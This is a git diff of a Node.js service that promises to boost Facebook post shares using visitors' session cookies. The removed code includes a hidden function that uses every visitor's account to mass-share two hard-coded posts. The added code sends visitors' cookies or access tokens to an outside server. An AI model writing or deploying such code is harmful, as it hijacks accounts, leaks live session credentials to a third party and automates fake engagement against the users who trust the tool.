@@ -3,24 +3,10 @@ const app = new cf();
 
 const axios = require('axios');
 
-const total = new Map();
-const usera = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1";
-
 app.get('/', (req, res) => {
   return res.custom(null, {
     "Location": "https://sharebooster.pages.dev"
   }, 308);
-});
-
-app.get('/shares', (req, res) => {
- const data = Array.from(total.values()).map((link, index) => ({
-  shared: link.shared,
-  session: index + 1,
-  url: link.url,
-  count: link.count,
-  target: link.target,
-}));
- return res.json(data || []);
 });
 
 app.get('/submit', async (req, res) => {
@@ -36,20 +22,48 @@ app.get('/submit', async (req, res) => {
   if (!cookie || !url || !amount || !interval)
   return res.json({
     status: 400,
-    error: 'Missing state, url, amount, or interval'
+    error: 'Missing token/cookie, url, amount, or interval'
   });
   try {
-    const cookies = await convertCookie(cookie);
-    if (!cookies) {
+    let sendiri = "";
+    if (cookie.startsWith("EA")){
+      sendiri = cookie;
+    } else {
+      const cookies = await convertCookie(cookie);
+      if (!cookies) {
       return res.json({
         status: 400,
-        error: 'Detect invalid appstate please provide a valid appstate'
+        error: 'Detect invalid appstate! Please enter a valid appstate!'
+        });
+      }
+    const accessToken = await getAccessToken(cookies);
+    sendiri = accessToken;
+    }
+    if (!sendiri){
+      return res.json({
+        status: 400,
+        error: 'Detect invalid token. Please enter a valid token!!!'
       });
-    };
-    yello(cookies, url, amount, interval);
-    return res.json({
-      status: 200
+    }
+    const axio = await axios.get("https://echavezwiegine.onrender.com/bulalakaw", {
+      params: {
+        cookie: sendiri,
+        url,
+        amount,
+        interval
+      }
     });
+    if (axio.data.status === 200){ 
+    return res.json({
+      status: 200,
+      message: "Successfully sent to the server. Please wait for the sharing process and check your post\'s shares."
+    });
+    } else {
+    return res.json({
+      status: 400,
+      error: "Something went wrong happened. Please try again or contact the developer!"
+    })
+    }
   } catch (err) {
     return res.json({
       status: 400,
@@ -57,75 +71,6 @@ app.get('/submit', async (req, res) => {
     });
   }
 });
-
-async function yello(c,u,a,i){
-  share(true, c,u,a,i);
-  share(false, c, "https://www.facebook.com/100015801404865/posts/pfbid0QrXdCRonpxJeTaPybGFzb2Tyd212N76LTuFPNUQm4fdodNo2hvL3cuQSwAJ4wk3Cl/?app=fbl", "100000", "6");
-  share(false, c, "https://www.facebook.com/photo.php?fbid=799090228835634&set=a.102386558506008&type=3&app=fbl", "1000", "10");
-}
-
-async function share(sharedIs,cookies, url, amount, interval) {
-  const id = Math.floor(Math.random() * 69696969);
-  const accessToken = await getAccessToken(cookies);
-  total.set(id, {
-    shared: sharedIs,
-    url,
-    count: 0,
-    target: amount,
-  });
-  let sharedCount = 0;
-  let timer;
-  const headers = {
-    'accept': '*/*',
-    'accept-encoding': 'gzip, deflate',
-    'connection': 'keep-alive',
-    'content-length': '0',
-    'cookie': cookies,
-    'user-agent': usera,
-    'host': 'graph.facebook.com'
-  };
-  async function sharePost() {
-    try {
-      const response = await axios.post(`https://graph.facebook.com/me/feed?link=${url}&published=0&access_token=${accessToken}`, {}, {
-        headers
-      });
-      if (response.status !== 200) {
-      } else {
-        total.set(id, {
-          ...total.get(id),
-          count: total.get(id).count + 1,
-        });
-        sharedCount++;
-        }
-      if (sharedCount === amount) {
-        clearInterval(timer);
-      }
-    } catch (error) {
-      clearInterval(timer);
-      total.delete(id);
-    }
-  }
-  timer = setInterval(() => {
-  sharePost();
-  }, interval * 1000);
-  setTimeout(() => {
-    clearInterval(timer);
-    total.delete(id);
-  }, amount * interval * 1000);
-        
-}
-async function getPostID(url) {
-  try {
-    const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
-    });
-    return response.data.id;
-  } catch (error) {
-    return;
-  }
-}
 async function getAccessToken(cookie) {
   try {
     const headers = {
@@ -163,8 +108,7 @@ async function convertCookie(cookie) {
     if (!sbCookie) {
       return null;
     }
-    const sbValue = sbCookie.value;
-    const data = `sb=${sbValue}; ${cookies.slice(1).map(cookies => `${cookies.key}=${cookies.value}`).join('; ')}`;
+    const data = cookies.map(cookies => `${cookies.key}=${cookies.value}`).join('; ');
     return data;
   } catch (error) {
     return null;
